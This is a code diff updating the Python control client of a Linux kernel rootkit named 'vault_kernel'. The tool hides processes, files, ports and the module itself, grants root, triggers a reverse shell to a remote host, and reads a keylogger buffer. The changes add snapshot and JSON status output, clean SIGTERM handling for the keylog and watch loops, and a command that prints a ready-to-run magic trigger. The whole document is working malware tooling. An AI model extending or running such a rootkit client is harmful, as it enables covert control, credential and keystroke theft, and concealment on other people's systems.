@@ -15,18 +15,22 @@ Commands:
     unhide-port <port>    Reveal a hidden port
     list [--json]         List all hidden items (PIDs, files, ports)
     stats [--json]        Show module stats (version, hooks, counts)
-    watch [--interval MS] Live view of stats + hidden list (default 1000 ms)
+    watch [--interval MS] [--once]
+                          Live view of stats + hidden list (--once: one
+                          frame, no ANSI; default refresh 1000 ms)
     give-root [pid]       Escalate a process to root (default: self)
     shell <ip:port>       Trigger reverse shell to remote host
     magic <word>          Set magic packet trigger word
-    keylog [--follow] [--interval MS] [--output FILE]
+    magic-encode <word> <port>
+                          Print the ready-to-run kill() trigger
+    keylog [--follow] [--timestamps] [--interval MS] [--output FILE]
                           Read captured keystrokes (stream with --follow)
     keylog-clear          Clear the keylogger buffer
     capture [--out FILE]  Evidence bundle: stats + hidden + keylog as JSON
     hide-module           Hide rootkit from lsmod
     unhide-module         Make rootkit visible in lsmod
     reset                 Clear ALL hidden files, PIDs and ports
-    status                Check if rootkit is loaded and show info
+    status [--json]       Check if rootkit is loaded and show info
     version               Print client version and ioctl ABI constants
     doctor [--json]       Diagnose module/client state (lab sanity check)
 """
@@ -39,12 +43,13 @@ import time
 import json
 import fcntl
 import errno
+import signal
 import argparse
 
 MAGIC = 0xC0
 DEVICE_PATH = "/dev/vault_kernel"
 SYSFS_MODULE = "/sys/module/vault_kernel"
-CLIENT_VERSION = "3.9"
+CLIENT_VERSION = "3.10"
 
 
 def _port_arg(value):
@@ -156,6 +161,21 @@ def format_version_line():
     in the Go client (client/go/cmd/vault_kernel/main.go)."""
     return (f"vault_kernel CLI v{CLIENT_VERSION} "
             f"(ioctl magic 0x{MAGIC:02X}, signal trigger {MAGIC_SIGNAL})")
+
+
+def _install_term_handler():
+    """Route SIGTERM through KeyboardInterrupt (v3.10) so every long
+    loop (`keylog --follow`, `watch`) stops the SAME way as Ctrl-C:
+    farewell message, sink flush/close, cursor restore. Without it,
+    `systemd stop`/`pkill -TERM` killed the CLI mid-write and skipped
+    the finally-blocks. No-op when signal handlers can't be set
+    (non-main thread, restricted environments)."""
+    def _handler(signum, frame):
+        raise KeyboardInterrupt
+    try:
+        signal.signal(signal.SIGTERM, _handler)
+    except (ValueError, OSError):
+        pass
 
 
 def _interval_ms_to_seconds(ms):
@@ -309,14 +329,22 @@ def build_capture_bundle(stats_raw: dict, hidden: dict, keylog_text: str,
 
 
 def format_watch_panel(stats: dict, hidden: dict, interval_ms: int,
-                       refreshed_at: str) -> str:
+                       refreshed_at: str, prev_stats: dict = None) -> str:
     """Build the full-frame text printed by `watch` on every refresh.
 
     Pure function — the client's watch loop only clears the screen and
-    repaints — mirroring RenderWatchPanel in the Go client: stats pairs
-    sorted and column-aligned at the widest key, then the parsed
+    repaints — mirroring RenderWatchPanelDiff in the Go client: stats
+    pairs sorted and column-aligned at the widest key, then the parsed
     hidden list.  Empty sections render as "(none)" and a missing
     stats report as "(no stats)".
+
+    With prev_stats (the parsed report of the PREVIOUS refresh, v3.10)
+    every stat whose value changed is annotated " (was <old>)" and
+    every key that did not exist before gets " (new)" — the live loop
+    shows WHAT moved without diffing frames by eye. prev_stats=None
+    (first frame, --once) renders the classic panel unchanged. Only
+    the stats section is annotated: the module's counters already
+    reflect changes in the hidden lists (ADR 20).
     """
     lines = [
         f"vault_kernel watch — refresh {interval_ms} ms — "
@@ -329,7 +357,14 @@ def format_watch_panel(stats: dict, hidden: dict, interval_ms: int,
         lines.append("== stats ==")
         width = max(len(k) for k in stats)
         for key in sorted(stats):
-            lines.append(f"{key:<{width}} : {stats[key]}")
+            suffix = ""
+            if prev_stats is not None:
+                old = prev_stats.get(key)
+                if old is None:
+                    suffix = " (new)"
+                elif old != stats[key]:
+                    suffix = f" (was {old})"
+            lines.append(f"{key:<{width}} : {stats[key]}{suffix}")
     lines.append("== hidden ==")
 
     def _items(xs):
@@ -360,6 +395,44 @@ def _reject(condition, message):
     the value inside the kernel's fixed-size buffers."""
     if condition:
         raise SystemExit(f"[-] {message}")
+
+
+def parse_modinfo(output: str) -> dict:
+    """Exact-key parser for `modinfo vault_kernel` output (v3.10) —
+    mirrors parseModinfo() in the Go client.  Only the contract keys
+    (filename, version, author, description) are extracted, by exact
+    line-start match (the previous substring scan printed srcversion
+    too); first occurrence wins, empty values skipped.  Returns {} when
+    none of the keys appeared — callers then omit the section."""
+    wanted = ("filename", "version", "author", "description")
+    out = {}
+    for line in output.splitlines():
+        key, sep, value = line.partition(":")
+        if not sep:
+            continue
+        key = key.strip().lower()
+        value = value.strip()
+        if key in wanted and key not in out and value:
+            out[key] = value
+    return out
+
+
+def build_status_document(device_present: bool, module_in_sysfs: bool,
+                          modinfo: dict = None) -> dict:
+    """Build the `status --json` document (v3.10, 5th JSON document) —
+    mirrors buildStatusReport() in the Go client.  Key order is
+    contractual (docs/schemas/status.md): schema, device_present,
+    module_in_sysfs, modinfo — the modinfo section (filename, version,
+    author, description in that order) is omitted when modinfo is
+    None/empty (best-effort field)."""
+    doc = {"schema": JSON_SCHEMA_VERSION,
+           "device_present": device_present,
+           "module_in_sysfs": module_in_sysfs}
+    if modinfo:
+        doc["modinfo"] = {k: modinfo[k]
+                          for k in ("filename", "version", "author",
+                                    "description") if k in modinfo}
+    return doc
 
 
 def run_doctor(as_json=False):
@@ -662,6 +735,10 @@ class VaultKernelClient:
             interval = _interval_ms_to_seconds(KEYLOG_DEFAULT_INTERVAL_MS)
         self._open()
         sink = None
+        if follow:
+            # v3.10: SIGTERM joins Ctrl-C on the same clean-stop path
+            # (farewell message + sink close); parity with the Go loop.
+            _install_term_handler()
 
         def _ensure_sink():
             """Lazy-open the output file (0600, append) on the FIRST
@@ -735,13 +812,34 @@ class VaultKernelClient:
             print("[-] Module visible again in lsmod")
         self._close()
 
-    def watch(self, interval_ms=WATCH_DEFAULT_INTERVAL_MS):
+    def watch(self, interval_ms=WATCH_DEFAULT_INTERVAL_MS, once=False):
         """Live view: clear the screen and repaint stats + hidden list
-        every interval_ms until Ctrl-C.  Rendering lives in
-        format_watch_panel (pure, unit-tested); this loop only owns the
-        refresh cadence and console cursor restoration."""
+        every interval_ms until Ctrl-C or SIGTERM (both stop cleanly
+        since v3.10).  With once=True render a SINGLE frame to stdout
+        without any ANSI control sequence and exit — the snapshot mode
+        for scripts and reports.  Rendering lives in format_watch_panel
+        (pure, unit-tested); this loop only owns the refresh cadence,
+        the prev-stats threading for the change annotations, and
+        console cursor restoration."""
         self._open()
+        prev_stats = None
         try:
+            if once:
+                stats_buf = bytearray(4096)
+                if not self._ioctl(IOCTL_GET_STATS, stats_buf):
+                    return
+                list_buf = bytearray(4096)
+                if not self._ioctl(IOCTL_LIST_HIDDEN, list_buf):
+                    return
+                stats = parse_stats_report(
+                    stats_buf.rstrip(b'\x00').decode(errors='replace'))
+                hidden = parse_hidden_list(
+                    list_buf.rstrip(b'\x00').decode(errors='replace'))
+                panel = format_watch_panel(
+                    stats, hidden, interval_ms, time.strftime("%H:%M:%S"))
+                print(panel, end="", flush=True)
+                return
+            _install_term_handler()
             print("\x1b[?25l", end="", flush=True)  # hide cursor
             while True:
                 stats_buf = bytearray(4096)
@@ -755,14 +853,17 @@ class VaultKernelClient:
                 hidden = parse_hidden_list(
                     list_buf.rstrip(b'\x00').decode(errors='replace'))
                 panel = format_watch_panel(
-                    stats, hidden, interval_ms, time.strftime("%H:%M:%S"))
+                    stats, hidden, interval_ms, time.strftime("%H:%M:%S"),
+                    prev_stats)
                 # ANSI: clear screen + home cursor, then the frame.
                 print("\x1b[2J\x1b[H" + panel, end="", flush=True)
+                prev_stats = stats
                 time.sleep(_interval_ms_to_seconds(interval_ms))
         except KeyboardInterrupt:
             print("\n[*] watch stopped")
         finally:
-            print("\x1b[?25h", end="", flush=True)  # show cursor
+            if not once:
+                print("\x1b[?25h", end="", flush=True)  # show cursor
             self._close()
 
     def reset(self):
@@ -772,22 +873,35 @@ class VaultKernelClient:
             print("[+] Reset: all hidden files, PIDs and ports cleared")
         self._close()
 
-    def status(self):
-        """Check if rootkit is loaded."""
-        if os.path.exists(DEVICE_PATH):
-            print("[*] vault_kernel kernel module is LOADED")
-            print(f"    Device: {DEVICE_PATH}")
+    def status(self, as_json=False):
+        """Check if rootkit is loaded.  With as_json=True (v3.10) emit
+        the FIFTH machine-readable document (docs/schemas/status.md) —
+        usable without root: status never opens the device.  modinfo is
+        best-effort and only present when the device exists and
+        `modinfo vault_kernel` ran successfully."""
+        device_present = os.path.exists(DEVICE_PATH)
+        module_in_sysfs = os.path.isdir(SYSFS_MODULE)
+        modinfo = None
+        if device_present:
             try:
                 import subprocess
                 result = subprocess.run(['modinfo', 'vault_kernel'],
                                         capture_output=True, text=True)
                 if result.returncode == 0:
-                    for line in result.stdout.splitlines():
-                        if 'version' in line.lower() or 'author' in line.lower() or \
-                           'description' in line.lower():
-                            print(f"    {line.strip()}")
+                    modinfo = parse_modinfo(result.stdout) or None
             except Exception:
-                pass
+                modinfo = None
+        if as_json:
+            print(json.dumps(build_status_document(
+                device_present, module_in_sysfs, modinfo), indent=2))
+            return
+        if device_present:
+            print("[*] vault_kernel kernel module is LOADED")
+            print(f"    Device: {DEVICE_PATH}")
+            if modinfo:
+                for key in ("version", "author", "description"):
+                    if key in modinfo:
+                        print(f"    {key}: {modinfo[key]}")
         else:
             print("[*] vault_kernel kernel module is NOT loaded")
             print("    Run: sudo insmod vault_kernel.ko")
@@ -799,9 +913,10 @@ class VaultKernelClient:
         buf = bytearray(4096)
         if self._ioctl(IOCTL_GET_STATS, buf):
             output = buf.rstrip(b'\x00').decode(errors='replace')
-            if not output:
-                print("(no stats returned)")
-            elif as_json:
+            if as_json:
+                # v3.10: the JSON path is checked FIRST — an empty/garbage
+                # report must FAIL (exit 1, same message as the Go client)
+                # instead of printing plain text with exit 0.
                 raw = parse_stats_report(output)
                 if not raw:
                     raise SystemExit("[-] module returned an empty stats report")
@@ -812,6 +927,8 @@ class VaultKernelClient:
                     except ValueError:
                         out[key] = value
                 print(json.dumps(out, indent=2, sort_keys=True))
+            elif not output:
+                print("(no stats returned)")
             else:
                 print(output)
         self._close()
@@ -874,7 +991,9 @@ def main():
     )
     subparsers = parser.add_subparsers(dest="command", help="Available commands")
 
-    subparsers.add_parser("status", help="Check if rootkit is loaded")
+    sp = subparsers.add_parser("status", help="Check if rootkit is loaded")
+    sp.add_argument("--json", action="store_true", dest="as_json",
+                    help="emit module presence as machine-readable JSON")
     sp = subparsers.add_parser("doctor", help="Diagnose module/client state (lab sanity check)")
     sp.add_argument("--json", action="store_true", dest="as_json",
                     help="emit diagnostics as machine-readable JSON")
@@ -913,6 +1032,8 @@ def main():
     sp.add_argument("--interval", type=_ms_arg,
                     default=WATCH_DEFAULT_INTERVAL_MS, metavar="MS",
                     help="refresh interval in ms (default 1000, min 50)")
+    sp.add_argument("--once", action="store_true",
+                    help="render a single frame and exit (no ANSI control)")
 
     sp = subparsers.add_parser("shell", help="Trigger reverse shell")
     sp.add_argument("target", type=_shell_target_arg,
@@ -948,6 +1069,10 @@ def main():
     subparsers.add_parser("unhide-module", help="Reveal in lsmod")
     subparsers.add_parser("reset", help="Clear ALL hidden files, PIDs and ports")
 
+    parser.add_argument("-v", "--version", action="version",
+                        version=format_version_line(),
+                        help="print the client version line and exit")
+
     args = parser.parse_args()
 
     if args.command is None:
@@ -964,7 +1089,7 @@ def main():
 
     try:
         if args.command == "status":
-            client.status()
+            client.status(as_json=args.as_json)
         elif args.command == "doctor":
             run_doctor(as_json=args.as_json)
         elif args.command == "give-root":
@@ -988,7 +1113,7 @@ def main():
         elif args.command == "watch":
             # --interval is documented in ms (like the Go client);
             # _interval_ms_to_seconds clamps to the 50 ms floor.
-            client.watch(interval_ms=args.interval)
+            client.watch(interval_ms=args.interval, once=args.once)
         elif args.command == "shell":
             client.shell(args.target)
         elif args.command == "magic":
